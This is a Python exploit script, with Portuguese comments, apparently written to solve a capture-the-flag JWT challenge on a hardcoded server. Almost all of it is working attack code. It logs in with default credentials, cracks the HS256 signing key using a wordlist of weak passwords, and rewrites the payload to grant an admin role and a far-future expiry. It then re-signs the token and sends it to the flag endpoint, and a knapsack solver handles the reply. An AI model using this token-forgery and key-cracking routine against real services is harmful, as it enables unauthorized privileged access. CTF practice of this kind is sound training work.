import requests
import json
import base64
import hmac
import hashlib
import sys
import time

# ========================= CONFIGURAÇÃO =========================
BASE_URL = "http://98.94.69.132:32444"   # Endereço do servidor
LOGIN_ENDPOINT = "/login"
FLAG_ENDPOINT = "/flag"
HELP_ENDPOINT = "/help"
# ===============================================================

# ---------- Funções auxiliares para Base64URL ----------
def base64url_decode(data: str) -> bytes:
    """Decodifica uma string Base64URL (sem padding) para bytes."""
    padding = '=' * (4 - len(data) % 4) if len(data) % 4 else ''
    return base64.urlsafe_b64decode(data + padding)

def base64url_encode(data) -> str:
    """
    Codifica dados (dict, str ou bytes) para Base64URL sem '=' e com '-' e '_'.
    """
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')
    elif isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def decode_jwt(token: str):
    """Separa e decodifica as partes de um JWT."""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Token JWT inválido: número de partes diferente de 3")
    header = json.loads(base64url_decode(parts[0]).decode('utf-8'))
    payload = json.loads(base64url_decode(parts[1]).decode('utf-8'))
    signature = parts[2]
    return header, payload, signature

# ---------- Força Bruta para descobrir a chave ----------
def brute_force_jwt_key(header: dict, payload: dict, signature: str, wordlist: list) -> str:
    """
    Testa cada palavra do wordlist como chave HMAC-SHA256.
    Retorna a chave encontrada ou None.
    """
    # Monta a mensagem original: header_encoded.payload_encoded
    header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')))
    payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')))
    message = f"{header_encoded}.{payload_encoded}".encode('utf-8')

    for word in wordlist:
        try:
            computed = hmac.new(word.encode('utf-8'), msg=message, digestmod=hashlib.sha256).digest()
            computed_encoded = base64.urlsafe_b64encode(computed).decode('utf-8').rstrip('=')
            if computed_encoded == signature:
                return word
        except Exception:
            continue
    return None

# ---------- Resolvedor do problema da mochila (opcional) ----------
def resolver_mochila(capacidade: int, pesos: list, valores: list) -> list:
    """Programação dinâmica para 0/1 Knapsack. Retorna índices dos itens escolhidos."""
    n = len(pesos)
    dp = [[0] * (capacidade + 1) for _ in range(n + 1)]
    for i in range(1, n + 1):
        for w in range(1, capacidade + 1):
            if pesos[i-1] <= w:
                dp[i][w] = max(valores[i-1] + dp[i-1][w - pesos[i-1]], dp[i-1][w])
            else:
                dp[i][w] = dp[i-1][w]
    # Reconstruir a solução
    w = capacidade
    itens = []
    for i in range(n, 0, -1):
        if dp[i][w] != dp[i-1][w]:
            itens.append(i-1)
            w -= pesos[i-1]
    return sorted(itens)

# ===================== MAIN =====================
def main():
    print("=== PASSO A PASSO — DESAFIO JWT ===\n")

    # ---------- 1. Reconhecimento ----------
    print("[1] Reconhecimento inicial dos endpoints...")
    endpoints = [HELP_ENDPOINT, LOGIN_ENDPOINT, FLAG_ENDPOINT, "/admin", "/config", "/profile"]
    for ep in endpoints:
        url = f"{BASE_URL}{ep}"
        try:
            r = requests.get(url, timeout=3)
            print(f"  {ep}: status {r.status_code}")
        except requests.exceptions.RequestException:
            print(f"  {ep}: erro de conexão ou timeout")

    # ---------- 2. Obter um token via login ----------
    print("\n[2] Tentando fazer login para obter um JWT...")
    credenciais = {"username": "user", "password": "password"}  # ajuste conforme necessário
    try:
        r = requests.post(f"{BASE_URL}{LOGIN_ENDPOINT}", json=credenciais, timeout=5)
        if r.status_code != 200:
            print("Falha no login. Talvez o endpoint não exista ou as credenciais estejam erradas.")
            print("Resposta do servidor:", r.text[:200])
            sys.exit(1)
        # Assume que a resposta é JSON com campo 'token' ou texto puro
        try:
            data = r.json()
            token = data.get('token', data.get('access_token'))
            if not token:
                token = r.text.strip()
        except:
            token = r.text.strip()
        print(f"[+] Token obtido: {token[:60]}...")
    except Exception as e:
        print(f"Erro ao tentar login: {e}")
        sys.exit(1)

    # ---------- 3. Decodificar o JWT ----------
    print("\n[3] Decodificando o JWT...")
    try:
        header, payload, signature = decode_jwt(token)
        print(f"  Header: {json.dumps(header, indent=2)}")
        print(f"  Payload: {json.dumps(payload, indent=2)}")
        print(f"  Assinatura (Base64URL): {signature}")
    except Exception as e:
        print(f"Erro ao decodificar: {e}")
        sys.exit(1)

    # ---------- 4. Testar token original no /flag ----------
    print("\n[4] Testando token original no endpoint /flag...")
    try:
        r = requests.get(f"{BASE_URL}{FLAG_ENDPOINT}", headers={"Authorization": token}, timeout=5)
        print(f"  Status: {r.status_code}")
        print(f"  Resposta (primeiros 200 caracteres): {r.text[:200]}")
    except Exception as e:
        print(f"Erro: {e}")

    # ---------- 5. Verificar algoritmo ----------
    if header.get('alg') != 'HS256':
        print("\n[!] Algoritmo não é HS256. Este exploit é específico para HS256.")
        sys.exit(1)
    print("\n[5] Algoritmo HS256 confirmado.")

    # ---------- 6. Força bruta para achar a chave ----------
    print("\n[6] Iniciando brute force com dicionário para descobrir a chave secreta...")
    wordlist = [
        'bola', 'admin', 'password', '123456', 'qwerty', 'abc123',
        'letmein', 'monkey', 'dragon', 'master', 'secret', 'jwt',
        'key', 'segredo', 'changeme', 'welcome', 'teste'
    ]
    chave = brute_force_jwt_key(header, payload, signature, wordlist)
    if chave:
        print(f"[+] Chave encontrada: '{chave}'")
    else:
        print("[-] Chave não encontrada no dicionário. Tente aumentar a lista.")
        sys.exit(1)

    # ---------- 7. Criar novo payload com privilégios ----------
    print("\n[7] Criando novo payload com permissão de administrador...")
    novo_payload = payload.copy()
    # Altere o campo de privilégio (pode ser 'role', 'admin', 'is_admin', etc.)
    if 'role' in novo_payload:
        novo_payload['role'] = 'admin'
    elif 'admin' in novo_payload:
        novo_payload['admin'] = True
    else:
        novo_payload['role'] = 'admin'   # fallback
    # Estender expiração para 2033
    novo_payload['exp'] = 2000000000
    print(f"  Novo payload: {json.dumps(novo_payload, indent=2)}")

    # ---------- 8. Reassinar o JWT ----------
    print("\n[8] Reassinando o JWT com a chave descoberta...")
    header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')))
    payload_encoded = base64url_encode(json.dumps(novo_payload, separators=(',', ':')))
    mensagem = f"{header_encoded}.{payload_encoded}".encode('utf-8')
    nova_assinatura = hmac.new(chave.encode('utf-8'), msg=mensagem, digestmod=hashlib.sha256).digest()
    nova_assinatura_encoded = base64.urlsafe_b64encode(nova_assinatura).decode('utf-8').rstrip('=')

    token_forjado = f"{header_encoded}.{payload_encoded}.{nova_assinatura_encoded}"
    print(f"[+] Token forjado: {token_forjado[:80]}...")

    # ---------- 9. Enviar token forjado para /flag ----------
    print("\n[9] Enviando token forjado para /flag...")
    try:
        r = requests.get(f"{BASE_URL}{FLAG_ENDPOINT}", headers={"Authorization": token_forjado}, timeout=5)
        print(f"  Status: {r.status_code}")
        corpo = r.text

        # Se a resposta for JSON com dados da mochila, resolvemos e mostramos a flag
        try:
            dados = json.loads(corpo)
            if "capacidade" in dados and "pesos" in dados and "valores" in dados:
                print("\n[+] Servidor retornou dados do problema da mochila. Resolvendo...")
                indices = resolver_mochila(
                    dados["capacidade"],
                    dados["pesos"],
                    dados["valores"]
                )
                print(f"🎯 RESPOSTA DA FLAG (lista de índices): {indices}")
                print("   Envie essa lista para o servidor para obter a flag final.")
            else:
                print("\n--- Conteúdo da resposta ---")
                print(corpo)
        except json.JSONDecodeError:
            print("\n--- Conteúdo da resposta (não JSON) ---")
            print(corpo)

    except Exception as e:
        print(f"Erro ao enviar token forjado: {e}")

    print("\n[10] Conclusão: a chave secreta fraca permitiu a forja do token. A falha está no uso de uma chave previsível.")

if __name__ == "__main__":
    main()